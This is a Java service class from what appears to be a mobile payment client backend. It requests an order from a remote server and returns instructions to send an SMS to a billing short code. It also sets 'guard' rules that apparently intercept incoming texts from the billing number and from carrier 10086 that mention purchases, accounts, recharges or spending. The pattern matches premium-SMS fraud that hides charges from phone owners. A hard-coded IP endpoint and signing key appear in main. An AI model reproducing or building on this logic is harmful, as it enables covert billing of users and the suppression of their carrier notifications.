package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.PostParamsData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.qlzf.commons.helper.MD5Encrypt;
import org.apache.commons.httpclient.NameValuePair;

public class Szts1DynamicService implements IDynamicService{

	private static final String TYPE = "szts1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	private static final Guard guard0 = new Guard("10658899","正在购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10658899","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658899","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private int timeOut = 60;
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String goodsId = map.get("goodsId");
			String goodsInf = map.get("goodsInf");
			String mobile = "13800138001";
			String key = map.get("key");
			
			goodsInf = goodsInf+"999999";
			
			String sign = MD5Encrypt.MD5Encode(goodsId+"#"+goodsInf+"#"+mobile+"#"+key).toLowerCase();
			
			NameValuePair[] pairs = new NameValuePair[4];
			pairs[0] = new NameValuePair("goodsId", goodsId);
			pairs[1] = new NameValuePair("goodsInf", goodsInf);
			pairs[2] = new NameValuePair("sign", sign);
			pairs[3] = new NameValuePair("mobile", mobile);
			
			String responseXml = PostParamsData.postData(url,pairs);
			System.out.println(responseXml);
			xml = parseXml(responseXml);
			
			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}

	private String parseXml(String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			String SpNumber = SingleXmlUtil.getNodeValue(responseXml, "SpNumber");
			String Code = SingleXmlUtil.getNodeValue(responseXml, "Code");
			
			if(SpNumber != null && SpNumber.length() > 0 && Code != null && Code.length() > 0){
				Code = Code.replace("&amp;","&");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(Code);
				sms.setSmsDest(SpNumber);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				guardList.add(guard3);
				guardList.add(guard4);
							
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
				
			}
			
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		String url = "http://183.62.161.183:3476/i2/MLDL/RecOrder";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("goodsId", "46");
		map.put("goodsInf","46#04202");
		map.put("key","TUOSI@MLDL");
		map.put("channel","10B201a123456789");
		
		System.out.println(new Szts1DynamicService().dynamic(map));
	}
}
